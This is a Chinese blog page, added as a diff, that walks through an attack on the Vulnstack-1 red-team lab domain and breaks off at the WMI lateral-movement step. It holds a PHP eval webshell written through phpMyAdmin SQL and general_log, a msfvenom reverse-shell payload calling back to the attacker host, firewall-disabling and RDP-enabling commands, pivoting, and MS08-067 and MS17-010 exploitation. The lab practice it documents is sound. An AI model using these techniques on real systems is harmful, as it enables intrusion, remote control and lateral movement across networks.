@@ -1,0 +1,210 @@
+<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="ATC&amp;CK Vulnstack-1"><meta name="keywords" content="红队评估,ATK&amp;CK,vulnstack,域渗透,内网渗透"><meta name="author" content="Ch4ce"><meta name="copyright" content="Ch4ce"><title>ATC&amp;CK Vulnstack-1 | Chaceshadow's Blog</title><link rel="shortcut icon" href="/favicon.png"><link rel="stylesheet" href="/css/index.css?version=1.7.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.7.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script src="https://v1.hitokoto.cn/?encode=js&amp;charset=utf-8&amp;select=.footer_custom_text" defer></script><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"./public/atom.xml","languages":{"hits_empty":"找不到您查询的内容:${query}"}},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  }
+} </script><meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="Chaceshadow's Blog" type="application/atom+xml">
+</head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ATK-amp-CK红队评估实战靶场（一）的搭建和模拟攻击过程全过程"><span class="toc-number">1.</span> <span class="toc-text">ATK&amp;CK红队评估实战靶场（一）的搭建和模拟攻击过程全过程</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-前言"><span class="toc-number">1.1.</span> <span class="toc-text">0x01 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-环境搭建"><span class="toc-number">1.2.</span> <span class="toc-text">0x02 环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-攻入内网"><span class="toc-number">1.3.</span> <span class="toc-text">0x03 攻入内网</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-信息收集"><span class="toc-number">1.3.1.</span> <span class="toc-text">3.1. 信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-1-1-主机探测"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">3.1.1 主机探测</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-1-2-端口扫描"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">3.1.2 端口扫描</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-1-3-目录扫描"><span class="toc-number">1.3.1.3.</span> <span class="toc-text">3.1.3 目录扫描</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-漏洞利用"><span class="toc-number">1.3.2.</span> <span class="toc-text">3.2. 漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-2-1-漏洞发现"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">3.2.1 漏洞发现</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#3-2-1-1-漏洞一：信息泄露-弱口令"><span class="toc-number">1.3.2.1.1.</span> <span class="toc-text">3.2.1.1 漏洞一：信息泄露+弱口令</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-2-1-2-漏洞二：PhpMyAdmin弱口令"><span class="toc-number">1.3.2.1.2.</span> <span class="toc-text">3.2.1.2  漏洞二：PhpMyAdmin弱口令</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-2-1-3-漏洞三：yxcms留言本XSS存储型漏洞"><span class="toc-number">1.3.2.1.3.</span> <span class="toc-text">3.2.1.3  漏洞三：yxcms留言本XSS存储型漏洞</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-2-1-4-漏洞四：yxcms后台任意文件读写漏洞"><span class="toc-number">1.3.2.1.4.</span> <span class="toc-text">3.2.1.4  漏洞四：yxcms后台任意文件读写漏洞</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-2-1-5-漏洞五：yxcms后台SQL注入漏洞"><span class="toc-number">1.3.2.1.5.</span> <span class="toc-text">3.2.1.5  漏洞五：yxcms后台SQL注入漏洞</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-2-1-6-漏洞六：PhpMyAdmin开启全局日志getshell"><span class="toc-number">1.3.2.1.6.</span> <span class="toc-text">3.2.1.6  漏洞六：PhpMyAdmin开启全局日志getshell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-CS上线GetShell"><span class="toc-number">1.3.3.</span> <span class="toc-text">3.3 CS上线GetShell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-4-系统信息收集"><span class="toc-number">1.3.4.</span> <span class="toc-text">3.4 系统信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-5-主机密码收集"><span class="toc-number">1.3.5.</span> <span class="toc-text">3.5 主机密码收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-6-远程桌面登录"><span class="toc-number">1.3.6.</span> <span class="toc-text">3.6 远程桌面登录</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-内网信息收集"><span class="toc-number">1.4.</span> <span class="toc-text">0x04 内网信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-域信息收集"><span class="toc-number">1.4.1.</span> <span class="toc-text">4.1 域信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-5-内网漏洞扫描"><span class="toc-number">1.4.2.</span> <span class="toc-text">4.5 内网漏洞扫描</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-横向渗透"><span class="toc-number">1.5.</span> <span class="toc-text">0x05 横向渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-MSF反弹shell"><span class="toc-number">1.5.1.</span> <span class="toc-text">5.1 MSF反弹shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-2-内网流量转发-MSF-proxychains"><span class="toc-number">1.5.2.</span> <span class="toc-text">5.2 内网流量转发(MSF+proxychains)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-3-MS08-067-搭配Bind-TCP"><span class="toc-number">1.5.3.</span> <span class="toc-text">5.3 MS08-067 搭配Bind TCP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-5-WMI获取域控服务器"><span class="toc-number">1.5.4.</span> <span class="toc-text">5.5 WMI获取域控服务器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-6-票据加计划任务获取DC"><span class="toc-number">1.5.5.</span> <span class="toc-text">5.6 票据加计划任务获取DC</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-后记"><span class="toc-number">1.6.</span> <span class="toc-text">0x06 后记</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-参考资料"><span class="toc-number">1.7.</span> <span class="toc-text">0x07 参考资料</span></a></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">Ch4ce</div><div class="author-info__description text-center">孟冬</div><div class="follow-button"><a href="https://github.com/Chaceshadow" target="_blank" rel="noopener">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">17</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">44</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">分类</span><span class="pull-right">5</span></a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(/welcome-image.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Chaceshadow's Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/gallery">Gallery</a><a class="site-page" href="/categories">Categories</a><a class="site-page" href="/about">About</a></span><span class="pull-right"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> Search</span></a></span></div><div id="post-info"><div id="post-title">ATC&amp;CK Vulnstack-1</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-09-28</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA/">实战靶场</a></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h1 id="ATK-amp-CK红队评估实战靶场（一）的搭建和模拟攻击过程全过程"><a href="#ATK-amp-CK红队评估实战靶场（一）的搭建和模拟攻击过程全过程" class="headerlink" title="ATK&amp;CK红队评估实战靶场（一）的搭建和模拟攻击过程全过程"></a>ATK&amp;CK红队评估实战靶场（一）的搭建和模拟攻击过程全过程</h1><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>本靶机环境是红日团队开源的一个红队实战测试环境，靶机下载地址如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;vulnstack.qiyuanxuetang.net&#x2F;vuln&#x2F;detail&#x2F;2&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p>通过模拟真实环境搭建的漏洞靶场，完全模拟ATK&amp;CK攻击链路进行搭建，形成完整个闭环。虚拟机默认密码为hongrisec@2019。</p>
+<a id="more"></a>
+
+<h2 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h2><p>本次环境搭建和靶机默认有些区别，我是在一台服务器的虚拟机上搭建的，服务器资源足够，为了避免运行卡顿，攻击机Kali也是在虚拟机上，具体配置如下，Kali虚拟机、WEB服务器win7外网网卡和宿主机桥接，和办公终端都是连到同一个局域网中。</p>
+<p>WEB服务器：windows7系统</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">外网网卡IP：192.168.1.102</span><br><span class="line">内网网卡IP：192.168.52.143</span><br></pre></td></tr></table></figure>
+
+<p>域成员：windows server 2003系统</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">网卡IP:192.168.52.141</span><br></pre></td></tr></table></figure>
+
+<p>域控服务器：windows server 2008系统</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">网卡IP：192.168.52.138</span><br></pre></td></tr></table></figure>
+
+<p>攻击机器：kali 2020.2</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kali IP:192.168.1.101</span><br></pre></td></tr></table></figure>
+
+<p>宿主机IP：windows server 2008系统</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IP:192.168.1.111</span><br></pre></td></tr></table></figure>
+
+<p>安装CobaltStrike服务器</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IP：192.168.1.236</span><br></pre></td></tr></table></figure>
+
+<p>搭建靶机环境拓扑图如下：</p>
+<p><img src="/2020/09/28/ATC-CK-Vulnstack-1/1.png" alt="ATT&amp;CK红队评估实战靶场（一）拓扑环境"></p>
+<p>模拟攻击示意图如下：</p>
+<p><img src="/2020/09/28/ATC-CK-Vulnstack-1/2.png" alt="模拟攻击过程"></p>
+<h2 id="0x03-攻入内网"><a href="#0x03-攻入内网" class="headerlink" title="0x03 攻入内网"></a>0x03 攻入内网</h2><h3 id="3-1-信息收集"><a href="#3-1-信息收集" class="headerlink" title="3.1. 信息收集"></a>3.1. 信息收集</h3><h4 id="3-1-1-主机探测"><a href="#3-1-1-主机探测" class="headerlink" title="3.1.1 主机探测"></a>3.1.1 主机探测</h4><p><code>netdiscover -i eth0 -r 192.168.1.0/24</code></p>
+<p><img src="/2020/09/28/ATC-CK-Vulnstack-1/3.png" alt></p>
+<h4 id="3-1-2-端口扫描"><a href="#3-1-2-端口扫描" class="headerlink" title="3.1.2 端口扫描"></a>3.1.2 端口扫描</h4><p>发现IP192.168.1.102，使用nmap探测端口开放情况（注意需要现在win7主机运行PhpStudy）</p>
+<p><code>nmap -sC -v -n -sV -Pn -p 1-65535 192.168.1.102</code></p>
+<p><img src="/2020/09/28/ATC-CK-Vulnstack-1/4.png" alt></p>
+<p>发现80端口开启，访问页面<code>http://192.168.1.102/</code>发现页面如下，存在大量信息泄露，收集有效信息。</p>
+<p><img src="/2020/09/28/ATC-CK-Vulnstack-1/5.png" alt></p>
+<h4 id="3-1-3-目录扫描"><a href="#3-1-3-目录扫描" class="headerlink" title="3.1.3 目录扫描"></a>3.1.3 目录扫描</h4><p>使用7kbscan-WebPathBrute目录扫描工具开展漏洞扫描</p>
+<p><img src="/2020/09/28/ATC-CK-Vulnstack-1/6.png" alt></p>
+<p>发现网站备份文件和phpadmin后台管理界面</p>
+<p><img src="/2020/09/28/ATC-CK-Vulnstack-1/7.png" alt></p>
+<p>打开备份文件发现网站源码，打开robots.txt发现网站CMS为yxcms，访问<code>http://192.168.1.102/yxcms</code>进入网站首页</p>
+<p><img src="/2020/09/28/ATC-CK-Vulnstack-1/8.png" alt></p>
+<h3 id="3-2-漏洞利用"><a href="#3-2-漏洞利用" class="headerlink" title="3.2. 漏洞利用"></a>3.2. 漏洞利用</h3><h4 id="3-2-1-漏洞发现"><a href="#3-2-1-漏洞发现" class="headerlink" title="3.2.1 漏洞发现"></a>3.2.1 漏洞发现</h4><h5 id="3-2-1-1-漏洞一：信息泄露-弱口令"><a href="#3-2-1-1-漏洞一：信息泄露-弱口令" class="headerlink" title="3.2.1.1 漏洞一：信息泄露+弱口令"></a>3.2.1.1 漏洞一：信息泄露+弱口令</h5><p>网站泄露后台地址和用户密码，且用户密码为弱口令</p>
+<p><img src="/2020/09/28/ATC-CK-Vulnstack-1/9.png" alt></p>
+<p>成功登录网站后台界面</p>
+<p><img src="/2020/09/28/ATC-CK-Vulnstack-1/10.png" alt></p>
+<h5 id="3-2-1-2-漏洞二：PhpMyAdmin弱口令"><a href="#3-2-1-2-漏洞二：PhpMyAdmin弱口令" class="headerlink" title="3.2.1.2  漏洞二：PhpMyAdmin弱口令"></a>3.2.1.2  漏洞二：PhpMyAdmin弱口令</h5><p>发现使用默认用户名/口令（root/root）成功登录PhpMyAdmin管理页面</p>
+<p><img src="/2020/09/28/ATC-CK-Vulnstack-1/11.png" alt></p>
+<h5 id="3-2-1-3-漏洞三：yxcms留言本XSS存储型漏洞"><a href="#3-2-1-3-漏洞三：yxcms留言本XSS存储型漏洞" class="headerlink" title="3.2.1.3  漏洞三：yxcms留言本XSS存储型漏洞"></a>3.2.1.3  漏洞三：yxcms留言本XSS存储型漏洞</h5><p>前台提交带有XSS代码的留言</p>
+<p><img src="/2020/09/28/ATC-CK-Vulnstack-1/12.png" alt></p>
+<p>后台审核成功弹出XSS弹窗</p>
+<p><img src="/2020/09/28/ATC-CK-Vulnstack-1/13.png" alt></p>
+<p>审核通过之后，前台同样成功弹窗</p>
+<p><img src="/2020/09/28/ATC-CK-Vulnstack-1/14.png" alt></p>
+<p>可通过该漏洞获取管理员cookie或者诱导管理员点击执行某恶意代码</p>
+<h5 id="3-2-1-4-漏洞四：yxcms后台任意文件读写漏洞"><a href="#3-2-1-4-漏洞四：yxcms后台任意文件读写漏洞" class="headerlink" title="3.2.1.4  漏洞四：yxcms后台任意文件读写漏洞"></a>3.2.1.4  漏洞四：yxcms后台任意文件读写漏洞</h5><p>在后台创建新模板模块创建内容为一句话的新模板</p>
+<p><img src="/2020/09/28/ATC-CK-Vulnstack-1/15.png" alt></p>
+<p>通过前面的备份文件可知文件保存的目录<code>http://192.168.1.102/yxcms/protected/apps/default/view/default/hack.php</code></p>
+<p><img src="/2020/09/28/ATC-CK-Vulnstack-1/16.png" alt></p>
+<p>使用蚁剑成功连接shell</p>
+<p><img src="/2020/09/28/ATC-CK-Vulnstack-1/17.png" alt></p>
+<h5 id="3-2-1-5-漏洞五：yxcms后台SQL注入漏洞"><a href="#3-2-1-5-漏洞五：yxcms后台SQL注入漏洞" class="headerlink" title="3.2.1.5  漏洞五：yxcms后台SQL注入漏洞"></a>3.2.1.5  漏洞五：yxcms后台SQL注入漏洞</h5><p>在后台的碎片列表中进行删除操作，删除碎片ID可能存在盲注漏洞，使用dnslog获取SQL注入得到数据。</p>
+<p><em>yxcms漏洞代码原理解析参考文章<code>https://www.freebuf.com/column/162886.html</code></em></p>
+<h5 id="3-2-1-6-漏洞六：PhpMyAdmin开启全局日志getshell"><a href="#3-2-1-6-漏洞六：PhpMyAdmin开启全局日志getshell" class="headerlink" title="3.2.1.6  漏洞六：PhpMyAdmin开启全局日志getshell"></a>3.2.1.6  漏洞六：PhpMyAdmin开启全局日志getshell</h5><p>首先测试是否可以使用select into outfile直接写入</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> <span class="string">'&lt;?php eval($_POST[hack]);?&gt; '</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'C:/phpStudy/WWW/hack.php'</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/28/ATC-CK-Vulnstack-1/18.png" alt></p>
+<p>写入失败， <code>show global variables like ‘%secure%’</code>查看变量secure-file-priv  值为NULL，且为只读无法修改。</p>
+<p>尝试使用全局日志写入shell，查看全局变量general_log：<code>show global variables like ‘%general_%’</code></p>
+<p><img src="/2020/09/28/ATC-CK-Vulnstack-1/19.png" alt></p>
+<p>开启全局日志并修改日志保存位置为C:/phpStudy/WWW/hack.php</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log=<span class="keyword">on</span>;</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file=<span class="string">'C:/phpStudy/WWW/hack.php'</span>;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/2020/09/28/ATC-CK-Vulnstack-1/20.png" alt></p>
+<p>查询一句话写入日志<code>Select &#39;&lt;?php eval($_POST[hack]);?&gt;&#39;</code></p>
+<p><img src="/2020/09/28/ATC-CK-Vulnstack-1/21.png" alt></p>
+<p>使用蚁剑连接一句话木马<code>http://192.168.1.102/hack.php</code></p>
+<p><img src="/2020/09/28/ATC-CK-Vulnstack-1/22.png" alt></p>
+<h3 id="3-3-CS上线GetShell"><a href="#3-3-CS上线GetShell" class="headerlink" title="3.3 CS上线GetShell"></a>3.3 CS上线GetShell</h3><p>CS客户端服务端都部署在192.168.1.236主机上，创建监听并生成powershell</p>
+<p><img src="/2020/09/28/ATC-CK-Vulnstack-1/23.png" alt></p>
+<p>时间反应比较慢，建议多执行几次并等一会</p>
+<p>提权成功</p>
+<p><img src="/2020/09/28/ATC-CK-Vulnstack-1/24.png" alt></p>
+<h3 id="3-4-系统信息收集"><a href="#3-4-系统信息收集" class="headerlink" title="3.4 系统信息收集"></a>3.4 系统信息收集</h3><p>查看网卡</p>
+<p><img src="/2020/09/28/ATC-CK-Vulnstack-1/25.png" alt></p>
+<p><img src="/2020/09/28/ATC-CK-Vulnstack-1/26.png" alt></p>
+<p>发现内网ip地址192.168.52.143和域god.org，查看域信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net group &#x2F;domain  #查看域内所有用户列表</span><br><span class="line">net group “domain computers” &#x2F;domain #查看域成员计算机列表</span><br><span class="line">net group “domain admins” &#x2F;domain #查看域管理员用户</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/28/ATC-CK-Vulnstack-1/27.png" alt></p>
+<p><img src="/2020/09/28/ATC-CK-Vulnstack-1/28.png" alt></p>
+<p>本机计算机名字为STU1，另外还有两个域用户分别是DEV1、ROOT-TVI862UBEH、域控制用户为OWA</p>
+<h3 id="3-5-主机密码收集"><a href="#3-5-主机密码收集" class="headerlink" title="3.5 主机密码收集"></a>3.5 主机密码收集</h3><p>获取系统用户名和密码</p>
+<p><img src="/2020/09/28/ATC-CK-Vulnstack-1/29.png" alt></p>
+<h3 id="3-6-远程桌面登录"><a href="#3-6-远程桌面登录" class="headerlink" title="3.6 远程桌面登录"></a>3.6 远程桌面登录</h3><p>远程开启3389端口并关闭防火墙</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">注册表开启3389端口</span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">关闭防火墙</span><br><span class="line">netsh firewall set opmode disable   			#winsows server 2003 之前</span><br><span class="line">netsh advfirewall set allprofiles state off 	#winsows server 2003 之后</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/28/ATC-CK-Vulnstack-1/30.png" alt></p>
+<p>这个时候防火墙是开启，我们需要关闭防火墙，使用域用户god\administrator/hongrisec@2020成功登录这一台win7WEB主机</p>
+<p><img src="/2020/09/28/ATC-CK-Vulnstack-1/31.png" alt></p>
+<h2 id="0x04-内网信息收集"><a href="#0x04-内网信息收集" class="headerlink" title="0x04 内网信息收集"></a>0x04 内网信息收集</h2><h3 id="4-1-域信息收集"><a href="#4-1-域信息收集" class="headerlink" title="4.1 域信息收集"></a>4.1 域信息收集</h3><p>前面收集到的信息Win7计算机名字为STU1，另外还有两个域用户分别是DEV1、ROOT-TVI862UBEH、域控制用户为OWA</p>
+<p>win7内网的IP地址为192.168.52.143</p>
+<p>进一步开始收集，通过Ladon 192.168.52.0/24 OnlinePC探测域内存活主机</p>
+<p><img src="/2020/09/28/ATC-CK-Vulnstack-1/32.png" alt></p>
+<p>域成员：192.168.52.141</p>
+<p>域控DC：192.168.52.138</p>
+<h3 id="4-5-内网漏洞扫描"><a href="#4-5-内网漏洞扫描" class="headerlink" title="4.5 内网漏洞扫描"></a>4.5 内网漏洞扫描</h3><p>前期我们获取到win7的远程桌面也可以通过远程发现win7主机上安装了nmap工具，我们可以进一步针对192.168.52.0/24内网网段进行漏洞信息收集<br><img src="/2020/09/28/ATC-CK-Vulnstack-1/33.png" alt></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap  --script-vlun -p 1-65535 192.168.52.141</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/09/28/ATC-CK-Vulnstack-1/34.png" alt></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap  --script-vlun -p 1-65535 192.168.52.138</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/28/ATC-CK-Vulnstack-1/35.png" alt></p>
+<p>也可以自己上传工具开展信息漏洞收集工作，我们使用上传的Ladon工具</p>
+<p><img src="/2020/09/28/ATC-CK-Vulnstack-1/36.png" alt></p>
+<p>发现192.168.1.141存在漏洞：MS08-067、MS17-010，192.168.1.138存在MS17-010漏洞。</p>
+<p>攻击思路：</p>
+<p>1、我们可以直接全部使用MS17-010获取域成员和域控主机；</p>
+<p>2、使用MS08-067获取域成员主机，然后使用横向移动【VMI利用】获取域控主机</p>
+<h2 id="0x05-横向渗透"><a href="#0x05-横向渗透" class="headerlink" title="0x05 横向渗透"></a>0x05 横向渗透</h2><h3 id="5-1-MSF反弹shell"><a href="#5-1-MSF反弹shell" class="headerlink" title="5.1 MSF反弹shell"></a>5.1 MSF反弹shell</h3><p>这里我们使用Kali的msf先反弹一个shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#生成反弹shell文件</span><br><span class="line">msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.1.101 LPORT&#x3D;4444 -f raw &gt; shell.php</span><br><span class="line"></span><br><span class="line">#在本机中设置监听</span><br><span class="line"></span><br><span class="line">msfconsloe</span><br><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload php&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set lhost 192.168.1.101</span><br><span class="line">set lport 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>然后使用蚁剑上传shell.php，并访问</p>
+<p><img src="/2020/09/28/ATC-CK-Vulnstack-1/37.png" alt></p>
+<p><img src="/2020/09/28/ATC-CK-Vulnstack-1/38.png" alt></p>
+<h3 id="5-2-内网流量转发-MSF-proxychains"><a href="#5-2-内网流量转发-MSF-proxychains" class="headerlink" title="5.2 内网流量转发(MSF+proxychains)"></a>5.2 内网流量转发(MSF+proxychains)</h3><p><em>参考文章<code>https://www.freebuf.com/articles/network/125278.html</code></em></p>
+<p>成功获取msf反弹shell，添加路由到目标环境网络，使得msf能够通过win7路由转发访问192.168.25.0/24网段</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#查看路由信息</span><br><span class="line">run get_local_subnets</span><br><span class="line">#添加一条路由</span><br><span class="line">run autoroute -s 192.168.52.0&#x2F;24</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/28/ATC-CK-Vulnstack-1/39.png" alt></p>
+<p>使用msf的socks4代理模块</p>
+<p><img src="/2020/09/28/ATC-CK-Vulnstack-1/40.png" alt></p>
+<p>文本编辑器修改<code>etc/proxychains.conf</code>，在最后一行加上socks4代理服务器</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[ProxyList]</span><br><span class="line"></span><br><span class="line">socks4 192.168.1.101 1080</span><br></pre></td></tr></table></figure>
+
+<p>使用proxychains代理nmap扫描主机</p>
+<p><img src="/2020/09/28/ATC-CK-Vulnstack-1/41.png" alt></p>
+<h3 id="5-3-MS08-067-搭配Bind-TCP"><a href="#5-3-MS08-067-搭配Bind-TCP" class="headerlink" title="5.3 MS08-067 搭配Bind TCP"></a>5.3 MS08-067 搭配Bind TCP</h3><p>由于没有定义双向路由，目标系统无法直接连接到攻击机，所以我们需要将Bind_tcp设置为payload类型，在exploit操作成功之后，就要对连接到目标系统的端口进行监听，两者区别如下：</p>
+<p><img src="/2020/09/28/ATC-CK-Vulnstack-1/42.png" alt></p>
+<p>完整设置如下：</p>
+<p><img src="/2020/09/28/ATC-CK-Vulnstack-1/43.png" alt></p>
+<p>成功获取域成员192.168.1.141的shell</p>
+<p><img src="/2020/09/28/ATC-CK-Vulnstack-1/44.png" alt></p>
+<p>###　5.4 MS17-010获取域控服务器</p>
+<p>我们同样可以使用MS17-010获取域服务器和域控服务器权限，这里我们直接攻击域控服务器</p>
+<p>使用<code>exploit/windows/smb/ms17_010_eternalblue</code>攻击流程如下：</p>
+<p><img src="/2020/09/28/ATC-CK-Vulnstack-1/45.png" alt></p>
+<p><img src="/2020/09/28/ATC-CK-Vulnstack-1/46.png" alt></p>
+<p>获取失败，使用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_psexec</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;blind_tcp</span><br></pre></td></tr></table></figure>
+
+<p>攻击流程如下</p>
+<p><img src="/2020/09/28/ATC-CK-Vulnstack-1/47.png" alt></p>
+<p>仍然无法有效获取会话</p>
+<h3 id="5-5-WMI获取域控服务器"><a href="#5-5-WMI获取域控服务器" class="headerlink" title="5.5 WMI获取域控服务器"></a>5.5 WMI获取域控服务器</h3><p>上传vmiexec.vbs到192.168.52.143（win7）机器上，然后执行</p>
